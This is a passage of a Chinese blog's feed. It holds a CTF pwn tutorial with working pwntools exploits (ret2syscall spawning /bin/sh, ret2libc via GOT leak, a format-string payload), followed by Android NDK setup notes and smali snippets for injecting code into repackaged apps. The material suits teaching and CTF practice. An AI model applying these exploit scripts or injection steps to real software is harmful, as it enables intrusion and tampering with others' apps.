class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only <span class="string">'pop|ret'</span> | grep <span class="string">'ebx'</span></span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br><span class="line"></span><br><span class="line">ROPgadget --binary rop  --string <span class="string">'/bin/sh'</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br><span class="line"></span><br><span class="line">ROPgadget --binary rop  --only <span class="string">'int'</span>                 </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./rop'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">'A'</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>由于 libc 函数之间偏移是固定的，ASLR 保护只会随机中间地址，后 12 位是不变的，所以可以 got 表泄露已执行过的函数的地址。libc 中顺便也可以得到 /bin/sh。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak libc_start_main_got addr and return to main again"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get the related addr"</span></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fmtstr_payload(<span class="number">6</span>, &#123;<span class="number">0x08048000</span>:<span class="number">0x10203040</span>&#125;)</span><br><span class="line"><span class="string">'\x00\x80\x04\x08\x01\x80\x04\x08\x02\x80\x04\x08\x03\x80\x04\x08%48c%6$hhn%240c%7$hhn%240c%8$hhn%240c%9$hhn'</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;我用的是 windows 的 ubuntu。&lt;/p&gt;
&lt;h3 id=&quot;安装-pwntools&quot;&gt;&lt;a href=&quot;#安装-p
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/categories/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/categories/CTF/pwn/"/>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/tags/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Android Studio NDK 开发环境搭建</title>
    <link href="https://github.com/Cracke-S-J/2019/07/08/ndk/"/>
    <id>https://github.com/Cracke-S-J/2019/07/08/ndk/</id>
    <published>2019-07-08T09:17:51.000Z</published>
    <updated>2020-03-21T11:19:14.914Z</updated>
    
    <content type="html"><![CDATA[<ol><li>配好NDK路径。</li><li>在java层声明native方法，使用javah -d [路径] [类]，生成头文件。<br><code>C:\Users\12639\Documents\GitHub\Android\kuaiban\app\src\main\java&gt;javah -d ../jni ssj.kuaiban.MainActivity</code></li><li>在cpp里写代码。</li><li><p>写Android.mk和Application.mk</p><p>Android.mk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line"></span><br><span class="line">LOCAL_MODULE := checkFlag</span><br><span class="line">LOCAL_SRC_FILES := checkFlag.c</span><br><span class="line"></span><br><span class="line">include $(BUILD_SHARED_LIBRARY)</span><br></pre></td></tr></table></figure><p>Application.mk(其实这句话也没什么卵用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">APP_ABI := all</span><br></pre></td></tr></table></figure></li><li><p>右击app -&gt; Link C++ Project with Gradle -&gt; 选ndk-build -&gt; 选刚才写的Android.mk</p></li><li>配置build.gradle，在defaultConfig里面加：<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">externalNativeBuild &#123;</span><br><span class="line">         ndkBuild &#123;</span><br><span class="line">             arguments <span class="string">"NDK_APPLICATION_MK:=src/main/jni/Application.mk"</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></li></ol><p>在Android Studio 3.x上，这样基本就成了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;配好NDK路径。&lt;/li&gt;
&lt;li&gt;在java层声明native方法，使用javah -d [路径] [类]，生成头文件。&lt;br&gt;&lt;code&gt;C:\Users\12639\Documents\GitHub\Android\kuaiban\app\src\main
      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>给车王二手车套马甲</title>
    <link href="https://github.com/Cracke-S-J/2019/06/27/vest-car-king/"/>
    <id>https://github.com/Cracke-S-J/2019/06/27/vest-car-king/</id>
    <published>2019-06-27T12:26:41.000Z</published>
    <updated>2020-03-21T11:19:28.665Z</updated>
    
    <content type="html"><![CDATA[<p>加资源，要在R$*.smali、res/values/public.xml、res/value/ids.xml这三个里面加，编译不会出错，至于为什么闪退待研究。</p><p>然后手加了几段代码Activity$1.smali不能用，就用*&amp;111也可，加新class不忘注册。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;加资源，要在R$*.smali、res/values/public.xml、res/value/ids.xml这三个里面加，编译不会出错，至于为什么闪退待研究。&lt;/p&gt;
&lt;p&gt;然后手加了几段代码Activity$1.smali不能用，就用*&amp;amp;111也可，加新clas
      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
      <category term="马甲包" scheme="https://github.com/Cracke-S-J/categories/Android/%E9%A9%AC%E7%94%B2%E5%8C%85/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
      <category term="马甲包" scheme="https://github.com/Cracke-S-J/tags/%E9%A9%AC%E7%94%B2%E5%8C%85/"/>
    
  </entry>
  
  <entry>
    <title>Android静态注入常用代码</title>
    <link href="https://github.com/Cracke-S-J/2019/06/27/android-inject-code/"/>
    <id>https://github.com/Cracke-S-J/2019/06/27/android-inject-code/</id>
    <published>2019-06-27T10:20:08.000Z</published>
    <updated>2020-03-21T11:18:08.670Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Toast"><a href="#Toast" class="headerlink" title="Toast:"></a>Toast:</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span>-string v0, <span class="string">"toast"</span></span><br><span class="line"><span class="keyword">const</span>/<span class="number">4</span> v1, <span class="number">0x1</span></span><br><span class="line">invoke-<span class="keyword">static</span> &#123;p0, v0, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line">move-result-object v0</span><br><span class="line">invoke-virtual &#123;v0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br></pre></td></tr></table></figure><h2 id="AlertDialog"><a href="#AlertDialog" class="headerlink" title="AlertDialog:"></a>AlertDialog:</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>-instance v0, Landroid/app/AlertDialog$Builder;</span><br><span class="line">invoke-direct &#123;v0, p0&#125;, Landroid/app/AlertDialog$Builder;-&gt;&lt;init&gt;(Landroid/content/Context;)V</span><br><span class="line"><span class="keyword">const</span>-string v1, <span class="string">"title"</span></span><br><span class="line">invoke-virtual &#123;v0, v1&#125;, Landroid/app/AlertDialog$Builder;-&gt;setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;</span><br><span class="line">move-result-object v0</span><br><span class="line"><span class="keyword">const</span>-string v1, <span class="string">"message"</span></span><br><span class="line">invoke-virtual &#123;v0, v1&#125;, Landroid/app/AlertDialog$Builder;-&gt;setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;</span><br><span class="line">move-result-object v0</span><br><span class="line"><span class="keyword">const</span>-string v1, <span class="string">"button"</span></span><br><span class="line"><span class="keyword">new</span>-instance v2, Lcom/carking/cn/activity/MainActivity$<span class="number">111</span>;</span><br><span class="line">invoke-direct &#123;v2, p0&#125;, Lcom/carking/cn/activity/MainActivity$<span class="number">111</span>;-&gt;&lt;init&gt;(Lcom/carking/cn/activity/MainActivity;)V</span><br><span class="line">invoke-virtual &#123;v0, v1, v2&#125;, Landroid/app/AlertDialog$Builder;-&gt;setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;</span><br><span class="line">move-result-object v0</span><br><span class="line"><span class="keyword">const</span>-string v1, <span class="string">"button"</span></span><br><span class="line"><span class="keyword">const</span>/<span class="number">4</span> v2, <span class="number">0x0</span></span><br><span class="line">invoke-virtual &#123;v0, v1, v2&#125;, Landroid/app/AlertDialog$Builder;-&gt;setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;</span><br><span class="line">move-result-object v0</span><br><span class="line">invoke-virtual &#123;v0&#125;, Landroid/app/AlertDialog$Builder;-&gt;show()Landroid/app/AlertDialog;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">.class Lcom/carking/cn/activity/Another$<span class="number">111</span>;</span><br><span class="line">.<span class="keyword">super</span> Ljava/lang/Object;</span><br><span class="line">.source <span class="string">"Another.java"</span></span><br><span class="line"></span><br><span class="line"># interfaces</span><br><span class="line">.implements Landroid/content/DialogInterface$OnClickListener;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># annotations</span><br><span class="line">.annotation system Ldalvik/annotation/EnclosingMethod;</span><br><span class="line">    value = Lcom/carking/cn/activity/Another;-&gt;onCreate(Landroid/os/Bundle;)V</span><br><span class="line">.end annotation</span><br><span class="line"></span><br><span class="line">.annotation system Ldalvik/annotation/InnerClass;</span><br><span class="line">    accessFlags = <span class="number">0x0</span></span><br><span class="line">    name = <span class="keyword">null</span></span><br><span class="line">.end annotation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># instance fields</span><br><span class="line">.field <span class="keyword">final</span> synthetic <span class="keyword">this</span>$<span class="number">0</span>:Lcom/carking/cn/activity/Another;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># direct methods</span><br><span class="line">.method constructor &lt;init&gt;(Lcom/carking/cn/activity/Another;)V</span><br><span class="line">    .locals <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    iput-object p1, p0, Lcom/carking/cn/activity/Another$<span class="number">111</span>;-&gt;<span class="keyword">this</span>$<span class="number">0</span>:Lcom/carking/cn/activity/Another;</span><br><span class="line"></span><br><span class="line">    .line <span class="number">29</span></span><br><span class="line">    invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># virtual methods</span><br><span class="line">.<span class="function">method <span class="keyword">public</span> <span class="title">onClick</span><span class="params">(Landroid/content/DialogInterface;I)</span>V</span></span><br><span class="line"><span class="function">    .locals 3</span></span><br><span class="line"><span class="function">    .param p1, "dialog"    # Landroid/content/DialogInterface</span>;</span><br><span class="line">    .param p2, "which"    # I</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line <span class="number">34</span></span><br><span class="line">    <span class="keyword">const</span>-string v2, <span class="string">"https://www.google.com/"</span></span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;v2&#125;, Landroid/net/Uri;-&gt;parse(Ljava/lang/String;)Landroid/net/Uri;</span><br><span class="line"></span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    .line <span class="number">35</span></span><br><span class="line">    .local v1, <span class="string">"uri"</span>:Landroid/net/Uri;</span><br><span class="line">    <span class="keyword">new</span>-instance v0, Landroid/content/Intent;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span>-string v2, <span class="string">"android.intent.action.VIEW"</span></span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v0, v2, v1&#125;, Landroid/content/Intent;-&gt;&lt;init&gt;(Ljava/lang/String;Landroid/net/Uri;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">36</span></span><br><span class="line">    .local v0, <span class="string">"it"</span>:Landroid/content/Intent;</span><br><span class="line">    iget-object v2, p0, Lcom/carking/cn/activity/Another$<span class="number">111</span>;-&gt;<span class="keyword">this</span>$<span class="number">0</span>:Lcom/carking/cn/activity/Another;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v2, v0&#125;, Lcom/carking/cn/activity/Another;-&gt;startActivity(Landroid/content/Intent;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">39</span></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>Intent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>-instance v0, Landroid/content/Intent;</span><br><span class="line">invoke-direct &#123;v0&#125;, Landroid/content/Intent;-&gt;&lt;init&gt;()V</span><br><span class="line"><span class="keyword">const</span>-<span class="class"><span class="keyword">class</span> <span class="title">v1</span>, <span class="title">Lcom</span>/<span class="title">carking</span>/<span class="title">cn</span>/<span class="title">activity</span>/<span class="title">Another</span></span>;</span><br><span class="line">invoke-virtual &#123;v0, p0, v1&#125;, Landroid/content/Intent;-&gt;setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;</span><br><span class="line">invoke-virtual &#123;p0, v0&#125;, Lcom/carking/cn/activity/MainActivity;-&gt;startActivity(Landroid/content/Intent;)V</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>-instance v0, Landroid/content/Intent;</span><br><span class="line"><span class="keyword">const</span>-<span class="class"><span class="keyword">class</span> <span class="title">v1</span>, <span class="title">Lcom</span>/<span class="title">ssj</span>/<span class="title">loopviewdemo</span>/<span class="title">LunbotuActivity</span></span>;</span><br><span class="line">invoke-direct &#123;v0, p0, v1&#125;, Landroid/content/Intent;-&gt;&lt;init&gt;(Landroid/content/Context;Ljava/lang/Class;)V</span><br><span class="line">.local v0, <span class="string">"intent"</span>:Landroid/content/Intent;</span><br><span class="line">invoke-virtual &#123;p0, v0&#125;, Lcom/ssj/loopviewdemo/MainActivity;-&gt;startActivity(Landroid/content/Intent;)V</span><br></pre></td></tr></table></figure><p><code>adb logcat -v threadtime &gt; a.log</code><br>——— beginning of crash</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Toast&quot;&gt;&lt;a href=&quot;#Toast&quot; class=&quot;headerlink&quot; title=&quot;Toast:&quot;&gt;&lt;/a&gt;Toast:&lt;/h2&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter
      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
  </entry>
  
</feed>
